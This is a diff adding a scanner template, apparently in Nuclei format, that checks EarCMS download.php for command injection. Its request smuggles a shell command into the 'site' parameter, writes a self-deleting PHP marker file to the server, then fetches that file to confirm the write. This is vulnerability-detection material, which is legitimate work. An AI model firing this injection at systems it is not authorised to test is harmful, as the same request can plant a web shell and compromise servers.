@@ -1,0 +1,31 @@
+id: poc-yaml-earcms-download-php-exec
+
+info:
+  name: poc-yaml-earcms-download-php-exec
+  author: sharecast
+  severity: critical
+  tags: xray-converted,ct-416446
+  reference:
+    - https://zhuanlan.zhihu.com/p/81934322
+
+http:
+  - raw:
+      - |
+        GET /source/pack/127.0.0.1/download.php?site=1%3Becho+%27%3C%3Fphp+echo+md5%28{{rand_int(1000, 9999)}}%29%3Bunlink%28__FILE__%29%3B%3F%3E%27+%3E+{{rand_base(8)}}.php%3B HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /source/pack/127.0.0.1/{{rand_base(8)}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
